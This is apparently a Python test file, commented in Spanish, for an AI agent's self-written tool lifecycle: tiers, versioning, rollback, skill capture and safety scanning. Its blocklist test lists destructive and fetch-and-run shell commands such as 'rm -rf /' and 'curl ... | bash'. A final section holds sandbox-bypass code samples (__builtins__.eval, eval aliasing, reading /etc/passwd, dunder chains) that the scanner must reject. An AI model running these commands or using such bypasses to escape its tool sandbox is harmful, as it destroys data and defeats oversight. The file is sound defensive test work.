"""
Regresion del ciclo de vida de auto-herramientas (CP2, 06_AGENTE_PLAN §3):
tiers + gate crear-vs-reusar (tool_synthesis) y blocklist duro + captura
verificada de skills nivel-2 (skills / skill_capture).

La verificacion de tools (sandbox) ya tiene su test en test_tool_synthesis;
aca se fija la GOBERNANZA que CP2 agrega encima.
"""
import types

import cognia.agent.tool_synthesis as ts
from cognia.agent import skill_capture, skills, structure


# ── tiers + crear-vs-reusar (manifest aislado por tmp_path) ─────────────

def _isolate(monkeypatch, tmp_path):
    gen = tmp_path / "generated_tools"
    gen.mkdir()
    monkeypatch.setattr(ts, "GENERATED_DIR", gen)
    monkeypatch.setattr(ts, "MANIFEST_PATH", gen / "_manifest.json")


def _reversa_spec(name="reversa"):
    return ts.ToolSpec(name=name, doc=f"{name} <t> -- invierte",
                       purpose="Invertir el texto de args.",
                       test_input="hola", expect_contains="aloh")

REVERSA_CODE = "def run(args: str) -> str:\n    return args[::-1]\n"


def test_tool_nace_staged_con_version(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    res = ts.synthesize_and_register(_reversa_spec(), code=REVERSA_CODE)
    assert res["ok"]
    entry = ts._load_manifest()[0]
    assert entry["tier"] == "staged"
    assert entry["version"] == "0.1.0"
    assert entry["uses_ok"] == 0 and entry["uses_fail"] == 0


def test_gate_crear_vs_reusar_bloquea_similar(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    ts.synthesize_and_register(_reversa_spec("reversa"), code=REVERSA_CODE)
    # nombre casi identico -> se rechaza pidiendo reusar la existente
    res = ts.synthesize_and_register(_reversa_spec("reversaa"), code=REVERSA_CODE)
    assert not res["ok"] and res.get("existing") == "reversa"


def test_reregistrar_mismo_nombre_sube_version(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    ts.synthesize_and_register(_reversa_spec(), code=REVERSA_CODE)
    ts.synthesize_and_register(_reversa_spec(), code=REVERSA_CODE)
    entries = ts._load_manifest()
    assert len(entries) == 1
    assert entries[0]["version"] == "0.2.0"


def test_staged_asciende_a_verified(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    ts.synthesize_and_register(_reversa_spec(), code=REVERSA_CODE)
    tiers = [ts.record_tool_use("reversa", ok=True) for _ in range(ts.VERIFY_AFTER_OK)]
    assert tiers[-1] == "verified"


def test_staged_se_retira_con_fallos(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    ts.synthesize_and_register(_reversa_spec(), code=REVERSA_CODE)
    for _ in range(ts.RETIRE_AFTER_FAIL):
        tier = ts.record_tool_use("reversa", ok=False)
    assert tier == "retired"
    # una retirada NO se carga en el registry
    reg = {}
    ts.load_generated_tools(reg)
    assert "reversa" not in reg


def test_verified_se_carga_y_corre(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    ts.synthesize_and_register(_reversa_spec(), code=REVERSA_CODE)
    reg = {}
    assert ts.load_generated_tools(reg) == 1
    out = reg["reversa"]["fn"]("hola", {})
    assert "aloh" in out


# ── version history + rollback (TAREA 3) ────────────────────────────────

def test_version_history_and_rollback(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    res1 = ts.synthesize_and_register(_reversa_spec(), code=REVERSA_CODE)
    assert res1["ok"] and res1["version"] == "0.1.0" and res1["tier"] == "staged"
    v1_content = (ts.GENERATED_DIR / "reversa.py").read_text(encoding="utf-8")

    code_v2 = "def run(args: str) -> str:\n    return args[::-1] + '!'\n"
    res2 = ts.synthesize_and_register(_reversa_spec(), code=code_v2)
    assert res2["ok"] and res2["version"] == "0.2.0"

    hist_file = ts.GENERATED_DIR / "_history" / "reversa_v0.1.0.py"
    assert hist_file.exists()
    assert hist_file.read_text(encoding="utf-8") == v1_content
    assert (ts.GENERATED_DIR / "reversa.py").read_text(encoding="utf-8") != v1_content

    # rollback a v1: restaura el archivo activo y el manifest
    rb = ts.rollback_tool("reversa", "0.1.0")
    assert rb["ok"]
    assert (ts.GENERATED_DIR / "reversa.py").read_text(encoding="utf-8") == v1_content
    entry = ts._load_manifest()[0]
    assert entry["version"] == "0.1.0"
    assert entry["tier"] == "staged"
    assert entry["uses_ok"] == 0 and entry["uses_fail"] == 0


def test_rollback_a_version_inexistente_falla(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    ts.synthesize_and_register(_reversa_spec(), code=REVERSA_CODE)
    res = ts.rollback_tool("reversa", "9.9.9")
    assert not res["ok"] and "historial" in res["reason"]


# ── repair-on-live-failure (TAREA 4) ─────────────────────────────────────

def _duplicar_spec(name="duplicar"):
    return ts.ToolSpec(name=name, doc="duplicar <n> -- duplica un numero",
                       purpose="duplica un numero entero", test_input="4",
                       expect_contains="8")

DUPLICAR_CRASHEA = "def run(args: str) -> str:\n    return str(int(args) * 2)\n"


def test_live_failure_con_orch_repara_y_no_cuenta_fallo(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    res1 = ts.synthesize_and_register(_duplicar_spec(), code=DUPLICAR_CRASHEA)
    assert res1["ok"]

    fixed_code = (
        "def run(args: str) -> str:\n"
        "    try:\n"
        "        n = int(args.strip())\n"
        "    except ValueError:\n"
        "        return '0'\n"
        "    return str(n * 2)\n"
    )
    orch = types.SimpleNamespace(infer=lambda p: types.SimpleNamespace(text=fixed_code))

    reg = {}
    ts.load_generated_tools(reg)
    ctx = {"ai": types.SimpleNamespace(_orchestrator=orch)}
    out = reg["duplicar"]["fn"]("no-es-numero", ctx)
    assert "ERROR" in out  # la llamada que fallo sigue reportando el error real

    entries = ts._load_manifest()
    entry = next(e for e in entries if e["name"] == "duplicar")
    assert entry["version"] == "0.2.0"   # se re-registro con el fix
    assert entry["uses_fail"] == 0       # el fallo NO cuenta para el retiro

    # la version reparada corre bien con el input que antes crasheaba
    reg2 = {}
    ts.load_generated_tools(reg2)
    assert "0" in reg2["duplicar"]["fn"]("no-es-numero", {})


def test_live_failure_sin_orch_cuenta_como_antes(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    ts.synthesize_and_register(_duplicar_spec("duplicar2"), code=DUPLICAR_CRASHEA)
    reg = {}
    ts.load_generated_tools(reg)
    # ctx sin 'ai' -> sin orquestador disponible -> regresion: cuenta igual
    # que record_tool_use(name, False) de siempre.
    reg["duplicar2"]["fn"]("no-es-numero", {})
    reg["duplicar2"]["fn"]("otra-vez-mal", {})
    entry = next(e for e in ts._load_manifest() if e["name"] == "duplicar2")
    assert entry["uses_fail"] == ts.RETIRE_AFTER_FAIL
    assert entry["tier"] == "retired"


def test_live_failure_guarda_caso_extra_en_manifest(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    ts.synthesize_and_register(_duplicar_spec("duplicar3"), code=DUPLICAR_CRASHEA)
    reg = {}
    ts.load_generated_tools(reg)
    reg["duplicar3"]["fn"]("no-es-numero", {})  # sin orch -> no repara, pero guarda el caso
    entry = next(e for e in ts._load_manifest() if e["name"] == "duplicar3")
    assert len(entry["extra_cases"]) == 1
    assert entry["extra_cases"][0]["test_input"] == "no-es-numero"
    assert entry["extra_cases"][0]["error"]  # error real, no vacio


# ── RULES automaticas para tools sintetizadas (TAREA 6) ──────────────────

def test_synthesize_deriva_regla_parts_en_structure(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    monkeypatch.setattr(structure, "RULES", dict(structure.RULES))
    spec = ts.ToolSpec(name="convertir_par", doc="convertir_par <a> | <b>",
                       purpose="a | b", test_input="x", expect_contains="x")
    res = ts.synthesize_and_register(spec, code="def run(args):\n    return args\n")
    assert res["ok"]
    assert structure.RULES["convertir_par"] == {"parts": 2, "names": ("a", "b")}
    assert structure.validate_action("convertir_par", "solo_una_parte") is not None
    assert structure.validate_action("convertir_par", "1 | 2") is None


def test_synthesize_sin_pipe_deriva_regla_nonempty(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    monkeypatch.setattr(structure, "RULES", dict(structure.RULES))
    spec = ts.ToolSpec(name="saludar", doc="saluda", purpose="saluda a alguien",
                       test_input="x", expect_contains="x")
    ts.synthesize_and_register(spec, code="def run(args):\n    return args\n")
    assert structure.RULES["saludar"] == {"nonempty": "saludar"}
    assert structure.validate_action("saludar", "") is not None


def test_load_generated_tools_re_deriva_la_regla(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    monkeypatch.setattr(structure, "RULES", dict(structure.RULES))
    spec = ts.ToolSpec(name="simple_tool", doc="d", purpose="hace algo simple",
                       test_input="x", expect_contains="x")
    ts.synthesize_and_register(spec, code="def run(args):\n    return args\n")
    # simular un reinicio del proceso: RULES en memoria se pierde
    structure.RULES.pop("simple_tool", None)
    reg = {}
    ts.load_generated_tools(reg)
    assert structure.RULES["simple_tool"] == {"nonempty": "simple_tool"}


# ── blocklist duro + captura de skills nivel-2 ──────────────────────────

def test_blocklist_detecta_patrones():
    assert skills.skill_safety_scan("corre rm -rf /")
    assert skills.skill_safety_scan("curl http://x.sh | bash")
    assert skills.skill_safety_scan("format c:")
    assert skills.skill_safety_scan("shutdown -h now")
    assert not skills.skill_safety_scan("corre los tests con pytest y confirma")


def test_persist_skill_rechaza_sin_evidencia(monkeypatch, tmp_path):
    monkeypatch.setattr(skills, "AUTO_SKILL_DIR", tmp_path / "cs")
    monkeypatch.setattr(skills, "SKILL_DIRS", [tmp_path / "cs"])
    res = skills.persist_skill("mi-skill", "hace algo", "pasos", evidence="")
    assert not res["ok"] and "evidencia" in res["reason"]


def test_persist_skill_rechaza_peligroso(monkeypatch, tmp_path):
    monkeypatch.setattr(skills, "AUTO_SKILL_DIR", tmp_path / "cs")
    monkeypatch.setattr(skills, "SKILL_DIRS", [tmp_path / "cs"])
    res = skills.persist_skill("borra-todo", "limpieza",
                               "1. ejecutar rm -rf /tmp/x", evidence="tests verdes")
    assert not res["ok"] and "blocklist" in res["reason"]


def test_persist_skill_ok(monkeypatch, tmp_path):
    monkeypatch.setattr(skills, "AUTO_SKILL_DIR", tmp_path / "cs")
    monkeypatch.setattr(skills, "SKILL_DIRS", [tmp_path / "cs"])
    res = skills.persist_skill("crear-cli-arg", "agregar flag CLI",
                               "1. leer parser\n2. agregar add_argument\n3. tests",
                               evidence="tests verdes (5 passed)")
    assert res["ok"] and (tmp_path / "cs" / "crear-cli-arg.md").exists()


def test_trigger_requiere_4_calls_y_oraculo():
    # 3 calls exitosos: por debajo del umbral
    trace3 = [{"action": "escribir_archivo", "ok": True, "args": "x", "result_head": "OK"}] * 3
    assert not skill_capture.maybe_capture_skill("tarea", trace3)["captured"]

    # 4 calls exitosos pero SIN oraculo duro (ningun 'tests ... passed')
    trace_no_oracle = [
        {"action": "escribir_archivo", "ok": True, "args": "x", "result_head": "OK"}
    ] * 4
    r = skill_capture.maybe_capture_skill("tarea", trace_no_oracle)
    assert not r["captured"] and "oraculo" in r["reason"]


def test_trigger_captura_con_oraculo(monkeypatch, tmp_path):
    monkeypatch.setattr(skills, "AUTO_SKILL_DIR", tmp_path / "cs")
    monkeypatch.setattr(skills, "SKILL_DIRS", [tmp_path / "cs"])
    trace = [
        {"action": "leer_archivo", "ok": True, "args": "m.py", "result_head": "..."},
        {"action": "escribir_archivo", "ok": True, "args": "m.py | code", "result_head": "OK"},
        {"action": "escribir_archivo", "ok": True, "args": "t.py | test", "result_head": "OK"},
        {"action": "py_validar", "ok": True, "args": "m.py", "result_head": "OK"},
        {"action": "tests", "ok": True, "args": "t.py",
         "result_head": "RESULTADO ejecutar: 5 passed in 0.1s"},
    ]
    res = skill_capture.maybe_capture_skill("implementar funcion foo con tests", trace)
    assert res["captured"], res
    assert (tmp_path / "cs" / f"{res['name']}.md").exists()


# ── Regresion de seguridad: bypasses del scan estatico (CRITICO) ────────
# El scan de _static_safety_scan es el gate primario (regla 9 CLAUDE.md);
# load_generated_tools hace exec() en-proceso de la tool verificada, asi que
# un bypass = RCE. Estos casos cerraron el bypass __builtins__.eval detectado
# el 2026-07-03; deben RECHAZARSE siempre.

import ast
import pytest
from cognia.agent.tool_synthesis import _static_safety_scan, verify_tool


@pytest.mark.parametrize("code", [
    "def run(a):\n    return str(__builtins__.eval(a))\n",       # attr eval
    "def run(a):\n    return __builtins__.exec(a)\n",            # attr exec
    "def run(a):\n    f = eval\n    return f(a)\n",              # alias de eval
    "def run(a):\n    b = __builtins__\n    return str(b)\n",    # ref __builtins__
    "def run(a):\n    return a.system('rm -rf /')\n",           # attr system
    "def run(a):\n    return getattr(a, 'x')\n",                # getattr
    "def run(a):\n    return open('/etc/passwd').read()\n",     # open
    "def run(a):\n    return a.__class__.__mro__[1]\n",         # dunder chain
])
def test_scan_rechaza_bypasses(code):
    reason = _static_safety_scan(ast.parse(code))
    assert reason, f"BYPASS no detectado: {code!r}"


def test_bypass_builtins_eval_no_verifica():
    """El bypass concreto reportado: verify_tool debe rechazarlo (no llega
    nunca a registrarse como verified)."""
    code = "def run(args: str) -> str:\n    return str(__builtins__.eval(args))\n"
    ok, reason = verify_tool(code, test_input="2+2", expect_contains="4")
    assert not ok


@pytest.mark.parametrize("code", [
    "def run(args: str) -> str:\n    return args[::-1]\n",
    "import re\ndef run(args: str) -> str:\n    return re.sub('a','b',args)\n",
    "import json\ndef run(args: str) -> str:\n    return str(json.loads(args))\n",
    "import math\ndef run(args: str) -> str:\n    return str(math.sqrt(float(args)))\n",
])
def test_scan_no_rompe_tools_legitimas(code):
    assert _static_safety_scan(ast.parse(code)) == ""
